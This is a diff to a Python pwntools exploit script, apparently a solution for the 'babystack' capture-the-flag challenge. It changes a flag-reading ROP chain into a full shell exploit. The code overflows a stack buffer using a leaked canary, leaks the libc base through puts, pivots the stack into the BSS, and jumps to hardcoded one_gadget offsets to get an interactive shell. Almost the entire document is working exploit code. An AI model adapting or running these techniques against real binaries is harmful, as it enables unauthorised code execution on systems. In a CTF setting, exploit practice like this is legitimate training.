@@ -2,6 +2,7 @@
 # -*- coding: utf-8 -*-
 from pwn import *
 from binascii import hexlify, unhexlify
+from time import sleep
 # CUSTOM FUNCTIONS
 def _snd(s):
   io.send(str(s))
@@ -138,7 +139,8 @@ def exploit():
 
 
     # 64 chars + cookie + 16 chars + rbp + rip
-    rip = pack(exe.address + 0xCA0)
+    read_input = exe.address + 0xCA0
+    rip = pack(read_input)
     #log.info("Return to {}".format(hex(rip)))
     #rip = pack(rip)
     login("\x00" + "A"*63 + cookie + "".ljust(16 + 8, FILL_CHAR) + rip, "")
@@ -159,16 +161,34 @@ def exploit():
     # that's why we send some valid address in the beginning of the rop chain
     bss_free_area = exe.address + 0x202018
 
+    # ROP chain to leak libc and for pivoting the stack to the BSS
     rop = ROP(exe)
-    rop.read(0, bss_free_area)
-    rop.open(bss_free_area, 0)
-    rop.read(3, bss_free_area)
-    rop.puts(bss_free_area)
-    rop.exit(0)
+    rop.puts(exe.got['puts'])
+    rop.call(read_input, [bss_free_area, 100])
+    rop.raw(exe.address + 0x10bd) # 0x00000000000010bd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+    rop.raw(bss_free_area)
     log.info(rop.dump())
     rop = pack(stack_addr) + "A"*24 + rop.chain()
     _snd(rop)
-    _snd("/home/babystack/flag\x00")
+
+    # Leak libc
+    libc = ELF(env['LD_PRELOAD'])
+    addr = unpack(io.recvline().strip() + "\x00\x00") - libc.symbols['puts']
+    libc.address = addr
+    log.success("Libc base: {}".format(hex(addr)))
+    io.clean()
+
+    # ROP to get the shell
+    rop = ROP(libc)
+    for i in range(3): # junk for pop r13,r14,r15
+        rop.raw(0xdeadbeef)
+    # magic gadgets
+    # 1 - rax == NULL
+    # 2,3,4 - [rsp + off] == NULL
+    one_gadget = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
+    rop.raw(libc.address + one_gadget[1])
+    log.info(rop.dump())
+    _snd(rop.chain())
 
     io.interactive()
 
